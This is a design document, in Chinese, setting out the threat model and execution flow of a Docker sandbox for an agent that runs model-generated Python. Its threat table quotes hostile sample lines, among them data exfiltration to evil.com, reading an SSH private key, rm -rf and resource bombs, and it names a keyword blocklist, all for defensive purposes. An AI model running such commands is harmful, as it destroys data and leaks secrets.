# 沙箱执行威胁模型与流程图

> 第二个项目：基于 Function Calling 的「数据分析 Agent」
> 本文档先于代码。目标是把「模型生成的代码要在哪里跑、跑的时候怎么防、
> 出错怎么捞回来」这三件事讲清楚，确认后再动手实现。

---

## 1. 为什么这层是项目的核心，而不是附属

这个 Agent 的闭环是「**生成代码 → 执行 → 观察结果 → 修正**」。
其中「执行」这一步，是把**一段由模型写出来、内容不可预知**的 Python 代码
放到了我们的机器上跑。这是整个系统里唯一一个「输入不可信 + 副作用真实」的环节。

对比第一个项目：RAG 里模型的输出只是一段文本，最坏情况是胡说，读者靠引用
就能识破。这里模型的输出是**可执行的指令**，最坏情况是删文件、占满内存、
把内网数据发出去。所以这一层的设计质量直接决定项目能不能算「工程」。

**本项目定位**：不是 UI 套壳。要证明的能力恰恰在这一层 —— 隔离、超时、
资源限制、结构化错误回填，以及成本控制。

## 2. 信任边界

```
┌─────────────────────────────────────────────────────────────────┐
│  可信区 (Trusted)                                                │
│                                                                  │
│   ┌──────────────┐   ┌──────────────┐   ┌──────────────────┐   │
│   │  FastAPI     │   │  Schema 提取 │   │  Executor 抽象   │   │
│   │  HTTP 层     │ → │  与采样      │ → │  (策略接口)      │   │
│   └──────────────┘   └──────────────┘   └────────┬─────────┘   │
│                                                   │              │
│   ┌───────────────────────────────────────────────┴──────────┐  │
│   │  编排循环 (手写 Function Calling，不用 LangGraph)        │  │
│   │  调模型 → 收 tool_call → 交 Executor → 回填结果 → 再调   │  │
│   └───────────────────────────────────────────────┬──────────┘  │
│                                                   │              │
└───────────────────────────────────────────────────┼──────────────┘
                                                    │ 只传
                                                    │ ① 代码文本
                                                    │ ② 数据文件路径
                                                    ▼
╔═════════════════════════════════════════════════════════════════╗
║  不可信区 (Untrusted) —— Docker 容器                             ║
║                                                                  ║
║   • 模型生成的代码在这里执行                                      ║
║   • network = none        没有任何出网口                         ║
║   • 数据目录只读挂载       能读，不能改                          ║
║   • 输出目录可写挂载       只能写这一个目录                      ║
║   • 非 root 用户           容器内无提权能力                      ║
║   • CPU / 内存 / PID 限额  资源用超即被杀                        ║
║   • 无 Docker socket       容器内起不了新容器                    ║
║                                                                  ║
╚═════════════════════════════════════════════════════════════════╝
```

**边界规则（唯一入口原则）**：跨过这条线的**只有两样东西** ——
一段代码文本（当作纯字符串处理，从不 `eval`、从不拼接进 shell）和一个
数据文件路径（挂载进容器，只读）。模型的输出**永远不参与构造宿主机的
命令行**。

> 反例（本设计明确禁止）：`subprocess.run(f"python {model_output}")`、
> `os.system(...)`、把模型给的路径直接拼进 `docker run -v` 的挂载参数。

## 3. 威胁模型

按 STRIDE 里与本场景相关的几类展开。每条给出「威胁 → 本次是否防 → 怎么防」。

| # | 威胁 | 具体场景 | 防护手段 | 级别 |
|---|---|---|---|---|
| T1 | **任意文件读写** | 模型写出 `open('C:/Users/.../.ssh/id_rsa')` 或 `shutil.rmtree('/')` | 容器内只挂载**两个**目录：数据目录（`ro`）、输出目录（`rw`）。宿主机其余路径在容器内根本不存在 | 必防 |
| T2 | **数据外泄** | `requests.post('http://evil.com', data=df.to_csv())` | `network=none`，容器内除了 loopback 没有任何网络设备；即便代码 `import requests` 也会连接失败 | 必防 |
| T3 | **资源耗尽（CPU）** | `while True: pass` 占满所有核心 | `--cpus=1`（可配）+ 墙钟超时强杀 | 必防 |
| T4 | **资源耗尽（内存）** | `[0] * 10**9` 把宿主内存吃光 | `--memory=512m` + `--memory-swap` 同值（禁 swap），触发即 OOM Kill | 必防 |
| T5 | **进程炸弹** | fork 循环把宿主进程表打满 | `--pids-limit=64` | 必防 |
| T6 | **提权 / 逃逸** | 利用内核漏洞或特权能力逃出容器 | `--security-opt=no-new-privileges`、非 root 用户运行、**不挂载** `/var/run/docker.sock`、不给孩子 `--privileged` | 必防 |
| T7 | **无限挂起** | `time.sleep(1e9)`、等待一个永不到来的输入 | 墙钟超时 + `docker rm -f` 强杀；不能用容器内信号（不可信进程可捕获） | 必防 |
| T8 | **输出爆量** | 打印百万行把日志撑爆磁盘 | 读取 stdout 时**限长截断**（默认 8KB），超出部分丢弃并标注 | 必防 |
| T9 | **持久化污染** | 往输出目录写巨型文件 / 塞满磁盘 | 输出目录配额 + 单次执行结果文件大小上限；超限则拒绝并报错 | 应防 |
| T10 | **供应链** | 容器镜像里被塞恶意包 | 基础镜像用官方 `python:3.13-slim` 固定 digest；依赖在构建期装好，运行期**不 pip install** | 应防 |
| T11 | **镜像膨胀** | 每次执行都新建容器，启动慢 | 使用预热镜像 + `--rm` 即用即抛；容器启动开销实测在百毫秒级，可接受 | 工程考量 |
| T12 | **模型诱导 Shell 注入** | 代码里 `os.system('rm -rf /host')` | 与 T1 同源：容器内看不到宿主路径，且非 root。**同时**在 Prompt 层明确禁用，但不作为唯一防线 | 必防 |

### 3.1 明确不在本次范围的威胁

诚实划界，避免把「没做」说成「做了」：

- **内核 0day 逃逸**：容器共享宿主内核，理论上存在逃逸可能。真正需要防这类
  威胁时要上 gVisor / Kata / 独立虚机。本项目定位是「防住模型写出的常规
  危险代码」，不是「抵御定向攻击者的内核漏洞利用」。此边界会写进 README。
- **多租户隔离**：本项目是单用户本地/自部署工具，不考虑租户间互相攻击。
- **侧信道**：不防时序 / 缓存侧信道。

## 4. 单次执行的完整流程

```
┌──────────────────────────────────────────────────────────────────────┐
│ ① 收到模型返回的 tool_call: run_python(code="...")                    │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ② 静态预检（快速失败，省一次容器启动）                                 │
│    • 代码长度上限（默认 20KB）→ 超限直接拒绝并回填错误                 │
│    • 空代码 / 纯注释 → 拒绝                                           │
│    • 关键字黑名单（import socket / subprocess / ctypes 等）           │
│      —— 仅作**第一道提示**，不作为安全依赖（见 T12）                   │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ③ 落盘                                                               │
│    • 代码 → 本次运行的临时工作目录 <tmp>/run_<id>/script.py            │
│    • 工作目录结构：                                                   │
│        run_<id>/                                                     │
│        ├── script.py       ← 生成的代码                               │
│        ├── data/           ← 宿主数据目录，只读挂载进容器             │
│        └── out/            ← 容器唯一可写目录，产物落这里             │
│    • run_<id> 用 uuid4 生成，杜绝路径猜测与并发覆盖                    │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ④ 拉起容器（一次性，--rm）                                            │
│    docker run --rm                                                   │
│      --network=none                                                   │
│      --cpus=1 --memory=512m --memory-swap=512m --pids-limit=64        │
│      --security-opt=no-new-privileges                                 │
│      --user 1000:1000                                                 │
│      -v <run_id>/data:/data:ro                                        │
│      -v <run_id>/out:/out:rw                                          │
│      -w /out                                                          │
│      <image> python -I /work/script.py                                │
│                                                                       │
│    注：script.py 通过只读挂载进 /work，容器内不可改自身代码。          │
│    用 python -I（隔离模式）跳过用户 site-packages 与 PYTHONPATH。      │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ⑤ 超时看护                                                           │
│                                                                       │
│    宿主侧用 subprocess + 墙钟计时：                                   │
│      • 到 timeout（默认 30s）→ docker rm -f <cid> 强杀                │
│      • 强杀后仍读走已产生的 stdout/stderr（截断到 8KB）               │
│      • 判定 exit_code = 124（超时约定码）                             │
│                                                                       │
│    ⚠️ 不用容器内 signal.alarm：被执行的代码不可信，可捕获/忽略信号。   │
│    唯一可靠的超时来自容器外部。                                       │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ⑥ 结果归类（结构化，不是一句 "报错了"）                                │
│                                                                       │
│    按 exit_code / stderr 特征分五类，各自给模型不同的补救提示：        │
│      OK            exit=0                    → 正常，附 stdout + 产物  │
│      TIMEOUT       墙钟超时被强杀            → 建议：缩小数据量/去循环 │
│      OOM           exit=137（非超时）        → 建议：分块处理/降内存   │
│      RUNTIME_ERROR exit=1 + Python traceback → 附**清洗后的**末段栈    │
│      SANDBOX_ERROR 容器起不来/镜像缺失        → 属于环境问题，直接抛出  │
│                                               不当作模型错误回填       │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ⑦ traceback 清洗与回填                                                │
│                                                                       │
│    • 剥掉宿主绝对路径（/tmp/run_xxx/script.py → script.py），         │
│      避免把本机目录结构泄漏进 Prompt，也让模型看到的行号对得上         │
│    • 只保留最后 N 行（默认 30 行）+ 异常类型与消息                     │
│    • 回填格式：                                                       │
│        status: RUNTIME_ERROR                                          │
│        stdout: <截断后的输出>                                         │
│        stderr: <清洗后的 traceback>                                   │
│        files:  ["/out/chart.png"]                                     │
│        hint:   "如为列名错误，请先用 get_schema 确认列名"              │
│    • 回填时**不改写模型给的代码**，让它在下一轮自己修                 │
└───────────────────────────────┬──────────────────────────────────────┘
                                ▼
┌──────────────────────────────────────────────────────────────────────┐
│ ⑧ 清理                                                               │
│    • --rm 已回收容器；宿主侧删掉 run_<id> 临时目录（可保留 N 次便于排查）│
│    • 产物（图表 / 结果 csv）复制到会话产物目录，供前端展示             │
└──────────────────────────────────────────────────────────────────────┘
```

### 4.1 为什么超时之后要「再读一遍输出」

被强杀的进程可能已经往 stdout 写了一部分内容（比如画图前的调试打印、
循环里前几次迭代的结果）。这些残留在排查「为什么会超时」时非常有用，
直接丢弃会让模型只能盲猜。所以强杀顺序是：**先 `docker rm -f`，再读走
缓冲区里已有的内容**，而不是杀完就当作零输出。

### 4.2 OOM 与超时的判定为什么不能只看退出码

- 超时强杀后，`docker rm -f` 的退出码和容器自身被杀不能简单等同，因此
  **超时由宿主侧的计时器判定为主**，退出码 124 只是辅助标记。
- OOM 时容器退出码为 137（SIGKILL）。设计阶段曾要求「137 + stderr 含
  `Killed`」双条件，**真机跑起来后证明这条是错的**：`Killed` 是 shell
  打印的，而这里是 `docker run` 直接起 python、没有 shell，实测 OOM 时
  stderr 为空。判据改为「非超时的 137 即 OOM」——在 `docker run --rm`
  场景下，非超时 SIGKILL 只可能来自 cgroup OOM killer（我们自己只在
  超时时 kill，那时 `timed_out` 已是 True）。stderr 关键词改为兜住
  Python 接住 `MemoryError` 后正常退出（exit 1）的那条路径。
- 附带教训：判定词表里**不能放裸 `oom`**，子串匹配会把 `boom`/`room`/
  `zoom` 一起吃进来，把普通运行错误误报成 OOM。只用完整短语或
  `oom-kill` 这种带连字符的形式。

## 5. LocalSubprocessExecutor 的位置与风险

作为本地调试用的备选实现，它**不使用容器**，直接用 `subprocess` 在宿主机
起一个子进程执行代码。这样做的价值是：迭代 Prompt / 调依赖时不用每次等镜像。

但它必须被明确标注为**开发期工具**：

- 启动时打印醒目警告（`⚠️ 本地子进程执行器无隔离，仅限本地调试`）。
- 配置项 `EXECUTOR=local` 时，若检测到非开发环境（如 `APP_ENV != dev`），
  直接**拒绝启动**而不是降级运行。
- 即便在本地模式，也要保留：超时强杀、输出截断、临时工作目录隔离。
  唯一放弃的是「文件系统 / 网络 / 资源」这三项隔离 —— 而这恰恰是最重要的
  三项，所以它不能用于任何联网或多人可访问的部署。

**默认实现永远是 `DockerExecutor`，策略选择只读配置不读模型输出** ——
不能让被执行的代码有机会改变自己的执行策略。

## 6. 四个取舍点的决定（2026-09-12 已确认）

1. **数据挂载 —— 最小权限，按需挂载单个文件**
   每次只挂载**本次会话实际用到的文件**（`ExecutionRequest.data_files`），
   复制到 `run_<id>/data/` 后再挂载。**不挂载整个上传目录** —— 上传目录里
   可能有与本次提问无关的其他数据，挂进去就是无谓的暴露面。
   采用副本而非软链：Windows 创建符号链接默认需要管理员权限，且副本目录
   的边界一目了然。文件名经 `safe_target_name()` 归一化，杜绝 `../../`
   把「副本」落到挂载目录之外。

2. **产物回传 —— 走文件系统，不用 stdout base64**
   代码写到 `/out`，宿主侧由 `_collect_artifacts()` 拷进持久的
   `artifact_dir`。不采用 base64 打到 stdout：那会撞上 8KB 的输出截断上限，
   图表这种动辄几 MB 的产物会被切得七零八落。

3. **容器 —— 每次新建、用完即焚，不引入常驻容器**
   坚持 `docker run --rm`，接受百毫秒级启动开销。换来的是环境绝对干净：
   上一次运行不会以任何形式污染下一次，也因此不必处理「容器被跑挂后
   如何恢复」这类问题 —— 复杂度明显上升而收益有限。

4. **运行目录 —— 保留最近 5 次**
   `keep_recent_runs=5`，由 `_prune_old_runs()` 按 mtime 回收。保留下来的
   目录是排查线上问题时唯一的现场：当时跑的代码、喂进去的数据、产出的图。

另有一处实现层面的已知差异：本地模式**没有 `/data` 挂载**（宿主机上不存在
容器内的绝对路径），因此本地模式下数据会额外复制一份到工作目录，代码用
**相对路径**访问。这也是它是「调试工具」而非等价实现的佐证之一。

## 7. 本文档与代码的对应关系

确认后，按以下顺序落地（每步都带测试）：

1. `sandbox/executor.py`：`ExecutionResult` 数据结构 + `Executor` 抽象基类
2. `sandbox/docker_executor.py`：Docker 实现（含超时看护、结果归类、traceback 清洗）
3. `sandbox/local_executor.py`：本地备选实现 + 环境检查
4. `sandbox/precheck.py`：静态预检与黑名单
5. `sandbox/image/Dockerfile`：固定 digest 的基础镜像 + 数据科学依赖
6. 针对以上每层的单测（全部用桩，不真的起容器；另加少量打标为
   `@pytest.mark.docker` 的真实集成测试，默认跳过）
